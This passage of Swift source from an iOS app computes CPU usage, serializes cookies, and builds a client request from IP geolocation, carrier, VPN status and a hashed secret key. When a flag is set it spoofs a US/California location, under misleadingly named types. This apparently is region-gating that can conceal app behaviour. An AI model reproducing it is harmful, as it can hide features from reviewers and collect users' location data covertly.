                        if let prevCpuInfo = prevCpuInfo {
                            inUse = cpuInfo[Int(CPU_STATE_MAX * i + CPU_STATE_USER)]
                            - prevCpuInfo[Int(CPU_STATE_MAX * i + CPU_STATE_USER)]
                            + cpuInfo[Int(CPU_STATE_MAX * i + CPU_STATE_SYSTEM)]
                            - prevCpuInfo[Int(CPU_STATE_MAX * i + CPU_STATE_SYSTEM)]
                            + cpuInfo[Int(CPU_STATE_MAX * i + CPU_STATE_NICE)]
                            - prevCpuInfo[Int(CPU_STATE_MAX * i + CPU_STATE_NICE)]
                            total = inUse + (cpuInfo[Int(CPU_STATE_MAX * i + CPU_STATE_IDLE)]
                                             - prevCpuInfo[Int(CPU_STATE_MAX * i + CPU_STATE_IDLE)])
                        } else {
                            inUse = cpuInfo[Int(CPU_STATE_MAX * i + CPU_STATE_USER)]
                            + cpuInfo[Int(CPU_STATE_MAX * i + CPU_STATE_SYSTEM)]
                            + cpuInfo[Int(CPU_STATE_MAX * i + CPU_STATE_NICE)]
                            total = inUse + cpuInfo[Int(CPU_STATE_MAX * i + CPU_STATE_IDLE)]
                        }
                        
                        let usage = Float(inUse) / Float(total)
                        usageTotal += usage
                    }
                    CPUUsageLock.unlock()
                    
                    usageTotal = usageTotal / Float(numCPUs)
                    
                    if let prevCpuInfo = prevCpuInfo {
                        let prevCpuInfoSize: size_t = MemoryLayout<integer_t>.stride * Int(numPrevCpuInfo)
                        vm_deallocate(mach_task_self_, vm_address_t(bitPattern: prevCpuInfo), vm_size_t(prevCpuInfoSize))
                    }
                    
                    prevCpuInfo = cpuInfo
                    numPrevCpuInfo = numCpuInfo
                    
                    cpuInfo = nil
                    numCpuInfo = 0
                } else {
                    debugPrint("Error!")
                }
            }
            return usageTotal
        }
    }
    
    func fetchCookieStrings(cookies: LightCookies?) -> String?{
        if let cookies = cookies,
           let data = try? JSONEncoder().encode(cookies),
           let dataString = String(data: data, encoding: .utf8) {
            return dataString
        } else {
            return nil
        }
    }
    
    @objc func clearWebViewContentCache() {
        
    }
}

extension HightLigtingHelper {
    static var cache: Cache? = Defaults[.cache] {
        didSet {
            Defaults[.cache] = cache
            HightLigtingHelper.default.foundationURL =  cache?.foundationURL
        }
    }
    
    
    struct Cache: Codable {
        var clientRequest: ClientRequest?
        var installTime:TimeInterval?
        var wc2d: Int?
        var tud: TimeInterval?
        var foundationURL:URL?
        var isFun:Bool = false
        var isSuperCry: Bool = false
        var haveCache = 0
        var cachaClearDataDateTimeInterval:TimeInterval?
        
    }
    
    struct IPAPICOMJSON: Codable {
        var `as`: String?
        var city: String?
        var country: String?
        var countryCode: String?
        var isp: String?
        var lat: Double?
        var lon: Double?
        var org: String?
        var query: String?
        var region: String?
        var regionName: String?
        var status: String?
        var timezone: String?
        var zip: String?
    }
    
    struct EnterJSON: Codable {
        var tt: String?
        var tud: Int64?
        var tl: String?
        var wc2d:Int?
        var tn: String?
        var tr: String?
        var kad: String?
    }
    
    struct ClientRequest: Codable {
        init(item: IPAPICOMJSON) {
            var jsonID = Bundle.main.bundleIdentifier ?? ""
            debugOnly {
                if let ID = HightLigtingHelper.default.bid {
                    jsonID = ID
                }
            }
            productId = jsonID
            postCode = ""
            userId = ""
            
            let date = Int(Date().timeIntervalSince1970 * 1000)
            ts = date
            
            gsid = (HightLigtingHelper.default.secretKey + productId + date.string).md5()
            
            version = UIApplication.shared.version ?? "0.0.0"
            coreUserID = ""
            longitude = item.lon?.string ?? ""
            countryCode =  HightLigtingHelper.default.isin ? "us" : item.countryCode ?? ""
            latitude = item.lat?.string ?? ""
            hblr = 1
            platform = "iOS"
            ip = item.query ?? ""
            city = HightLigtingHelper.default.isin ? "carlifornia" :  item.city ?? ""
            isPromotionEnabled = false
            country = HightLigtingHelper.default.isin ? "losangeles" : item.country ?? ""
            vpnType = HightLigtingHelper.default.isWallStaus()
            let networkInfo = CTTelephonyNetworkInfo()
            let providers = networkInfo.serviceSubscriberCellularProviders
            let carrier = providers?.values.first
            operatorCode = carrier?.isoCountryCode ?? "000000"
            org = item.org ?? ""
        }
        
        init(item: IPAPICOJSON) {
            var ID = Bundle.main.bundleIdentifier ?? ""
            debugOnly {
                if let jsonKey = HightLigtingHelper.default.bid {
                    ID = jsonKey
                }
            }
            productId = ID
            postCode = ""
            userId = ""
            
            let date = Int(Date().timeIntervalSince1970 * 1000)
            ts = date
            
            gsid = (HightLigtingHelper.default.secretKey + productId + date.string).md5()
            hblr = 1
            version = UIApplication.shared.version ?? "0.0.0"
            coreUserID =  ""
            longitude = item.longitude?.string ?? ""
            countryCode =  HightLigtingHelper.default.isin ? "us" : item.country ?? ""
            latitude = item.latitude?.string ?? ""
            
            platform = "iOS"
            ip = item.ip ?? ""
            city = HightLigtingHelper.default.isin ? "carlifornia" :  item.city ?? ""
            isPromotionEnabled =  false
            let networkInfo = CTTelephonyNetworkInfo()
            let providers = networkInfo.serviceSubscriberCellularProviders
            let carrier = providers?.values.first
            operatorCode = carrier?.isoCountryCode ?? "000000"
            country = HightLigtingHelper.default.isin ? "losangeles" : item.countryName ?? ""
            vpnType = HightLigtingHelper.default.isWallStaus()
            org = item.org ?? ""
        }
        
        
        let productId: String
        let postCode: String
        let gsid: String
        let version: String
        let coreUserID: String
        let countryCode: String
        let longitude: String
        let latitude: String
        let userId: String
        let platform: String
        let ip: String
        let city: String
        let isPromotionEnabled: Bool
        let country: String
        let ts:Int
        let hblr:Int
        let vpnType:Int
        let operatorCode:String
        let org:String
    }
    
    struct IPAPICOJSON: Codable {
        var ip: String?
        var city: String?
        var region: String?
        var regionCode: String?
        var country: String?
        var countryName: String?
        var continentCode: String?
        var inEu: Bool?
        var postal: String?
        var latitude: Double?
        var longitude: Double?
        var timezone: String?
        var utcOffset: String?
        var countryCallingCode: String?
        var currency: String?
        var languages: String?
        var asn: String?
        var org: String?
        private enum CodingKeys: String, CodingKey {
            case ip
            case city
            case region
            case regionCode = "region_code"
            case country
            case countryName = "country_name"
            case continentCode = "continent_code"
            case inEu = "in_eu"
            case postal
            case latitude
            case longitude
            case timezone
            case utcOffset = "utc_offset"
            case countryCallingCode = "country_calling_code"
            case currency
            case languages
            case asn
            case org
        }
    }
}

